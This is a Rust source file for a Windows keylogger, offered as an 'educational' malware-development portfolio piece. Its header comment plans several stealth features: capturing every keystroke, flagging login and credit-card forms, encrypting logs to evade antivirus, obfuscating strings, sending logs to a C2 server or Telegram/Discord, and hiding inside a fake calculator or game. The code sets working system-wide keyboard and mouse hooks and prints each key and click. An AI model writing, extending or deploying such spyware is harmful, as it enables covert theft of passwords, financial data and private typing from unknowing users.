use std::ptr;
use winapi::shared::windef::HHOOK;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
use winapi::um::sysinfoapi::{GetSystemInfo, GetVersionExW, SYSTEM_INFO};
use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
use winapi::um::winnt::OSVERSIONINFOW;
use std::mem;
use winapi::um::winuser::GetCursorPos;
use winapi::shared::windef::POINT;


use winapi::um::winuser::{
    CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
    HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
    WH_MOUSE_LL, MSLLHOOKSTRUCT, WM_LBUTTONDOWN, WM_RBUTTONDOWN, WM_MBUTTONDOWN,
};

/*
This is a keylogger for educational purposes only.
The main goal is proving some maldev portfolio + rust skills.
// Educational Purpose:
// This project is a keylogger for Windows developed in Rust for purely
// educational and research purposes in the field of 'malware development'. The goal is
// to understand the techniques used by this type of software to develop
// better defenses. The code will be part of a public portfolio on GitHub and will
// be used as material for a talk at the Ekoparty security conference.
// It must NOT be used for malicious purposes.
// -------------------------------------------------------------------

// # PHASE 1: Core Keylogger Requirements

// ## 1. Keystroke Hooking Module
//    - Objective: Silently capture all system-wide keystrokes.
//    - Implementation: Utilize a low-level keyboard hook via the WinAPI,
//      specifically with the `SetWindowsHookExA` and `GetMessage` functions.
//    - Log Format: Save the pressed key along with a timestamp. Handle
//      special keys like [SHIFT], [CTRL], [ENTER], [BACKSPACE], etc.

// ## 2. Context Awareness Module
//    - Objective: Understand where the user is typing to classify the information.
//    - 2.1. Active Application Identification:
//        - Implementation: Each time a key is captured, get the foreground window
//          (`GetForegroundWindow`) and its title (`GetWindowTextW`).
//        - Log: Record the process name (e.g., "chrome.exe") and the window title
//          (e.g., "Gmail - Inbox - Google Chrome").
//    - 2.2. Credential Form Detection:
//        - Heuristics: Analyze the window title and/or UI elements (if possible)
//          for keywords like "login", "sign in", "password", "register".
//    - 2.3. PII and Financial Data Form Detection:
//        - Heuristics: Similar to the previous point, look for keywords like "credit card",
//          "CVV", "billing address", "SSN".

// ## 3. Secure & Stealthy Storage Module
//    - Objective: Save the logs to the local disk in a way that is not easily
//      detectable or readable by an antivirus or a user.
//    - 3.1. Process Persistence:
//        - The program must run continuously and silently in the background.
//          Initially, it will be a console application, but the plan is to make it windowless.
//    - 3.2. Log Encryption:
//        - Implementation: Before writing data to the log file, encrypt it in memory.
//          Use a symmetric encryption algorithm (e.g., AES-GCM or ChaCha20-Poly1305)
//          with a key embedded in the binary.
//        - File Format: The resulting file will be binary, not plaintext,
//          preventing simple AV signatures from detecting it. A simple `cat` or `type`
//          command on the file will not reveal its contents.
//    - 3.3. Modern Evasion (Considerations):
//        - String Obfuscation: Avoid having cleartext strings in the binary (like "keylogger",
//          "hook", etc.).
//        - Dynamic API Loading: Load WinAPI functions at runtime
//          (`LoadLibrary`, `GetProcAddress`) to hinder static analysis.

// # PHASE 2: Future Enhancements

// ## 4. Data Exfiltration Module
//    - Objective: Periodically send the encrypted logs to a remote destination.
//    - Implementation (Future):
//        - Create an internal scheduler that activates every X hours.
//        - Send the log file through a discreet channel (e.g., an HTTP POST request
//          to a C2 server, using DNS-over-HTTPS, or via Telegram/Discord API).
//        - After sending, delete the local log to leave no trace.

// ## 5. Masquerading Module
//    - Objective: Make the keylogger appear to be a legitimate application.
//    - Implementation (Future):
//        - Package the keylogger inside an application with a real and useful
//          functionality (e.g., a calculator, a small game, a system optimizer).
//        - The keylogger will run in a separate thread while the main application
//          functions normally.

// # Dependencies (Crates to consider)
// - `winapi`: For direct calls to the Windows API.
// - `chrono`: For timestamp management.
// - `aes-gcm` or `chacha20poly1305`: For log encryption.
// - `reqwest`: (Future) For data exfiltration over HTTP.

*/


mod log;
mod encryption;
mod classifier;
mod scheduler;

// Función para conseguir información básica del sistema
fn get_basic_info() -> Result<(), Box<dyn std::error::Error>> {

    unsafe {
        // Obtener información del sistema
        let mut system_info: SYSTEM_INFO = mem::zeroed();
        GetSystemInfo(&mut system_info);
        
        // Obtener resolución de pantalla
        let screen_width = GetSystemMetrics(SM_CXSCREEN);
        let screen_height = GetSystemMetrics(SM_CYSCREEN);
        
        // Obtener información de la versión del OS
        let mut os_info: OSVERSIONINFOW = mem::zeroed();
        os_info.dwOSVersionInfoSize = mem::size_of::<OSVERSIONINFOW>() as u32;
        GetVersionExW(&mut os_info);
        
        println!("=== SYSTEM INFORMATION ===");
        println!("Screen Resolution: {}x{}", screen_width, screen_height);
        println!("Processor Architecture: {}", system_info.u.s().wProcessorArchitecture);
        println!("Number of Processors: {}", system_info.dwNumberOfProcessors);
        println!("Page Size: {} bytes", system_info.dwPageSize);
        println!("OS Version: {}.{}.{}", 
                os_info.dwMajorVersion, 
                os_info.dwMinorVersion, 
                os_info.dwBuildNumber);
        println!("=============================");
    }
    
    Ok(())
}

// Función para obtener coordenadas del mouse
fn get_mouse_coords() -> Result<(i32, i32), Box<dyn std::error::Error>> {
    
    unsafe {
        let mut point: POINT = mem::zeroed();
        if GetCursorPos(&mut point) != 0 {
            Ok((point.x, point.y))
        } else {
            Err("Failed to get cursor position".into())
        }
    }
}


fn main() {
    

    // Initialize logger
    println!("Starting keylogger...");
    println!("Press Ctrl+C to stop...");
    println!("Getting basic info");
    if let Err(e) = get_basic_info() {
        eprintln!("Error getting system info: {}", e);
    }



    // Agregar manejo de señales para cleanup limpio
    ctrlc::set_handler(move || {
        println!("\nReceived Ctrl+C, cleaning up...");
        unsafe {
            if !HOOK.is_null() {
                UnhookWindowsHookEx(HOOK);
                println!("Keyboard hook removed successfully");
            }
            if !MOUSE_HOOK.is_null() {
                UnhookWindowsHookEx(MOUSE_HOOK);
                println!("Mouse hook removed successfully");
            }
        }
        std::process::exit(0);
    }).expect("Error setting Ctrl+C handler");
    

    // Iniciar captura de teclas
    if let Err(e) = capture_input() {
        eprintln!("Error starting keylogger: {}", e);
        // Cleanup en caso de error
        unsafe {
            if !HOOK.is_null() {
                UnhookWindowsHookEx(HOOK);
            }
        }
        return;
    }


}




static mut HOOK: HHOOK = ptr::null_mut();
static mut MOUSE_HOOK: HHOOK = ptr::null_mut();


// Callback para teclas
unsafe extern "system" fn low_level_keyboard_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code == HC_ACTION as i32 {
        if w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize {
            let kb_struct = unsafe { *(l_param as *const KBDLLHOOKSTRUCT) };
            let vk_code = kb_struct.vkCode;
            
            // Convertir virtual key code a caracter
            let key_char = match vk_code {
                0x08 => "[BACKSPACE]".to_string(),
                0x09 => "[TAB]".to_string(),
                0x0D => "[ENTER]".to_string(),
                0x10 => "[SHIFT]".to_string(),
                0x11 => "[CTRL]".to_string(),
                0x12 => "[ALT]".to_string(),
                0x1B => "[ESC]".to_string(),
                0x20 => " ".to_string(),
                0x30..=0x39 => char::from(vk_code as u8).to_string(), // 0-9
                0x41..=0x5A => char::from(vk_code as u8).to_string(), // A-Z
                0x70..=0x87 => format!("[F{}]", vk_code - 0x6F), // F1-F12 y más
                0x90 => "[NUM LOCK]".to_string(),
                0x91 => "[SCROLL LOCK]".to_string(),
                0x14 => "[CAPS LOCK]".to_string(),
                0x2D => "[INSERT]".to_string(),
                0x2E => "[DELETE]".to_string(),
                0x24 => "[HOME]".to_string(),
                0x23 => "[END]".to_string(),
                0x21 => "[PAGE UP]".to_string(),
                0x22 => "[PAGE DOWN]".to_string(),
                0x25 => "[LEFT ARROW]".to_string(),
                0x26 => "[UP ARROW]".to_string(),
                0x27 => "[RIGHT ARROW]".to_string(),
                0x28 => "[DOWN ARROW]".to_string(),
                0x5B => "[LEFT WIN]".to_string(),
                0x5C => "[RIGHT WIN]".to_string(),
                0x5D => "[MENU]".to_string(),
                // Teclado numérico
                0x60..=0x69 => format!("[NUM {}]", vk_code - 0x60), // NUM 0-9
                0x6A => "[NUM *]".to_string(),
                0x6B => "[NUM +]".to_string(),
                0x6C => "[NUM ENTER]".to_string(),
                0x6D => "[NUM -]".to_string(),
                0x6E => "[NUM .]".to_string(),
                0x6F => "[NUM /]".to_string(),
                // Símbolos y puntuación
                0xBA => ";".to_string(),    // ;:
                0xBB => "=".to_string(),    // =+
                0xBC => ",".to_string(),    // ,<
                0xBD => "-".to_string(),    // -_
                0xBE => ".".to_string(),    // .>
                0xBF => "/".to_string(),    // /?
                0xC0 => "`".to_string(),    // `~
                0xDB => "[".to_string(),    // [{
                0xDC => "\\".to_string(),   // \|
                0xDD => "]".to_string(),    // ]}
                0xDE => "'".to_string(),    // '"
                // Teclas de modificadores adicionales
                0xA0 => "[LEFT SHIFT]".to_string(),
                0xA1 => "[RIGHT SHIFT]".to_string(),
                0xA2 => "[LEFT CTRL]".to_string(),
                0xA3 => "[RIGHT CTRL]".to_string(),
                0xA4 => "[LEFT ALT]".to_string(),
                0xA5 => "[RIGHT ALT]".to_string(),
                _ => format!("[{}]", vk_code),
            };
            
            // Print con fines de debugging
            println!("Key pressed: {}", key_char);
            // TODO: Aquí llamar a función de logging/encryption
        }
    }
    
    unsafe { CallNextHookEx(HOOK, n_code, w_param, l_param) }
}

// Callback para clicks del mouse
unsafe extern "system" fn low_level_mouse_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    // si el código es HC_ACTION, procesar el evento
    if n_code == HC_ACTION as i32 {
        if w_param == WM_LBUTTONDOWN as usize { // left click
            let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
            println!("LEFT CLICK at: ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
            
            // Ejecutar get_mouse_coords cuando hay click
            match get_mouse_coords() {
                Ok((x, y)) => println!("Mouse coordinates: ({}, {})", x, y),
                Err(e) => eprintln!("Error getting mouse coords: {}", e),
            }
        } else if w_param == WM_RBUTTONDOWN as usize { // right click
            let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
            println!("RIGHT CLICK at: ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
            
            match get_mouse_coords() {
                Ok((x, y)) => println!("Mouse coordinates: ({}, {})", x, y),
                Err(e) => eprintln!("Error getting mouse coords: {}", e),
            }
        } else if w_param == WM_MBUTTONDOWN as usize {
            let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
            println!("MIDDLE CLICK at: ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
            
            match get_mouse_coords() {
                Ok((x, y)) => println!("Mouse coordinates: ({}, {})", x, y),
                Err(e) => eprintln!("Error getting mouse coords: {}", e),
            }
        }
        // Otros eventos de mouse que ignoramos
    }
    
    unsafe { CallNextHookEx(MOUSE_HOOK, n_code, w_param, l_param) }
}


// Renombrar y actualizar la función para capturar tanto teclado como mouse
fn capture_input() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // Instalar hook de teclado
        HOOK = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(low_level_keyboard_proc),
            ptr::null_mut(),
            0,
        );
        
        if HOOK.is_null() {
            return Err("Failed to install keyboard hook".into());
        }
        
        // Instalar hook de mouse
        MOUSE_HOOK = SetWindowsHookExW(
            WH_MOUSE_LL,
            Some(low_level_mouse_proc),
            ptr::null_mut(),
            0,
        );
        
        if MOUSE_HOOK.is_null() {
            UnhookWindowsHookEx(HOOK); // Cleanup del keyboard hook
            return Err("Failed to install mouse hook".into());
        }
        
        println!("Keyboard and mouse hooks installed successfully");
        println!("Click anywhere or type to see input capture...");
        
        // Loop de mensajes para mantener ambos hooks activos
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            // Los hooks procesan automáticamente los eventos
        }
        
        // Cleanup
        UnhookWindowsHookEx(HOOK);
        UnhookWindowsHookEx(MOUSE_HOOK);
    }
    
    Ok(())
}